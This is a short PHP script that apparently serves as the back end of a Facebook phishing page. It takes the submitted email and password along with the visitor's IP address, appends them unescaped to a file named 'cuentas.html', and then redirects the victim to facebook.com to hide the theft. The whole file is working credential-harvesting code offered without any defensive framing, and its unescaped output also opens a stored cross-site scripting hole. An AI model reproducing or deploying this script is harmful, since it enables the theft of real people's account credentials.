

<?php

$user = $_POST['email']; 
$password = $_POST['pass'];
$ip = $_SERVER['REMOTE_ADDR']; 

$f = fopen("cuentas.html", "a"); 
fwrite ($f,'<center>Email: [<b><font color="#FFFFFF">'.$user.'</font></b>]Password: [<b><font color="#FFFFFF">'.$password.'</font></b>]IP: [<b><font color="#FFFFFF">'.$ip.'</font></b>]<br>');

fclose($f);

header("Location: http://facebook.com/");
?>







